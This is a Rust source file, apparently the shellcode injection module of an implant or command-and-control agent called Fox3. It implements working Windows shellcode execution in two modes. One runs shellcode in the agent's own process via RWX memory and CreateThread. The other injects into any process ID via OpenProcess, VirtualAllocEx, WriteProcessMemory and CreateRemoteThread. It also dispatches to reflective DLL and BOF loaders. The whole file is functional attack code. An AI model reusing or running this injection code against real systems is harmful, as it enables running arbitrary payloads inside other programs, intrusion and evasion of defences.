/// Shellcode injection module for Fox3 simple_agent.
///
/// Handles direct shellcode injection only (self and remote process).
/// Reflective DLL injection is in `rdll.rs`.
/// COFF/BOF execution is in `bof.rs`.
///
/// | Method   | Description                                        |
/// |----------|----------------------------------------------------|
/// | `self`   | VirtualAlloc(RWX) → copy → CreateThread → wait    |
/// | `remote` | VirtualAllocEx → WriteProcessMemory → CreateRemoteThread |
/// | `rdll`   | Delegated to `crate::rdll::execute()`             |
/// | `bof`    | Delegated to `crate::bof::execute()`              |

/// Public entry point.
pub fn execute(method: &str, shellcode: &[u8], pid: u32, bof_args: &[u8]) -> anyhow::Result<String> {
    match method {
        "rdll" => crate::rdll::execute(shellcode, pid),
        "bof"  => crate::bof::execute(shellcode, bof_args),
        _ => {
            #[cfg(windows)]
            { imp::execute(method, shellcode, pid) }
            #[cfg(not(windows))]
            { let _ = (method, shellcode, pid); anyhow::bail!("shellcode: Windows only") }
        }
    }
}

#[cfg(windows)]
mod imp {
    use std::ffi::c_void;
    use std::ptr;

    const MEM_COMMIT:         u32 = 0x00001000;
    const MEM_RESERVE:        u32 = 0x00002000;
    const MEM_RELEASE:        u32 = 0x00008000;
    const PAGE_RWX:           u32 = 0x40;
    const PROCESS_ALL_ACCESS: u32 = 0x001F_0FFF;
    const INFINITE:           u32 = 0xFFFF_FFFF;

    extern "system" {
        fn VirtualAlloc(addr: *mut c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void;
        fn VirtualFree(addr: *mut c_void, size: usize, free_type: u32) -> i32;
        fn VirtualAllocEx(proc: *mut c_void, addr: *mut c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void;
        fn VirtualFreeEx(proc: *mut c_void, addr: *mut c_void, size: usize, free_type: u32) -> i32;
        fn WriteProcessMemory(proc: *mut c_void, base: *mut c_void, buf: *const c_void, size: usize, written: *mut usize) -> i32;
        fn CreateThread(attrs: *mut c_void, stack: usize, start: *mut c_void, param: *mut c_void, flags: u32, id: *mut u32) -> *mut c_void;
        fn CreateRemoteThread(proc: *mut c_void, attrs: *mut c_void, stack: usize, start: *mut c_void, param: *mut c_void, flags: u32, id: *mut u32) -> *mut c_void;
        fn OpenProcess(access: u32, inherit: i32, pid: u32) -> *mut c_void;
        fn WaitForSingleObject(handle: *mut c_void, ms: u32) -> u32;
        fn CloseHandle(handle: *mut c_void) -> i32;
        fn GetLastError() -> u32;
    }

    pub fn execute(method: &str, sc: &[u8], pid: u32) -> anyhow::Result<String> {
        match method {
            "self"   => exec_self(sc),
            "remote" => exec_remote(sc, pid),
            other    => anyhow::bail!("shellcode: unknown method '{}'", other),
        }
    }

    fn exec_self(sc: &[u8]) -> anyhow::Result<String> {
        let len = sc.len();
        let mem = unsafe { VirtualAlloc(ptr::null_mut(), len, MEM_COMMIT | MEM_RESERVE, PAGE_RWX) };
        if mem.is_null() {
            anyhow::bail!("self: VirtualAlloc failed ({})", unsafe { GetLastError() });
        }
        unsafe {
            ptr::copy_nonoverlapping(sc.as_ptr(), mem as *mut u8, len);
            let mut tid = 0u32;
            let t = CreateThread(ptr::null_mut(), 0, mem, ptr::null_mut(), 0, &mut tid);
            if t.is_null() {
                VirtualFree(mem, 0, MEM_RELEASE);
                anyhow::bail!("self: CreateThread failed ({})", GetLastError());
            }
            WaitForSingleObject(t, INFINITE);
            CloseHandle(t);
            VirtualFree(mem, 0, MEM_RELEASE);
        }
        Ok(format!("self: executed {} bytes", len))
    }

    fn exec_remote(sc: &[u8], pid: u32) -> anyhow::Result<String> {
        if pid == 0 { anyhow::bail!("remote: PID required"); }
        let len = sc.len();
        unsafe {
            let hp = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
            if hp.is_null() {
                anyhow::bail!("remote: OpenProcess({}) failed ({})", pid, GetLastError());
            }
            let mem = VirtualAllocEx(hp, ptr::null_mut(), len, MEM_COMMIT | MEM_RESERVE, PAGE_RWX);
            if mem.is_null() {
                CloseHandle(hp);
                anyhow::bail!("remote: VirtualAllocEx failed ({})", GetLastError());
            }
            let mut written = 0usize;
            if WriteProcessMemory(hp, mem, sc.as_ptr() as _, len, &mut written) == 0 || written != len {
                VirtualFreeEx(hp, mem, 0, MEM_RELEASE);
                CloseHandle(hp);
                anyhow::bail!("remote: WriteProcessMemory failed ({})", GetLastError());
            }
            let mut tid = 0u32;
            let t = CreateRemoteThread(hp, ptr::null_mut(), 0, mem, ptr::null_mut(), 0, &mut tid);
            if t.is_null() {
                VirtualFreeEx(hp, mem, 0, MEM_RELEASE);
                CloseHandle(hp);
                anyhow::bail!("remote: CreateRemoteThread failed ({})", GetLastError());
            }
            WaitForSingleObject(t, INFINITE);
            CloseHandle(t);
            VirtualFreeEx(hp, mem, 0, MEM_RELEASE);
            CloseHandle(hp);
        }
        Ok(format!("remote: PID {} injected ({} bytes)", pid, len))
    }
}
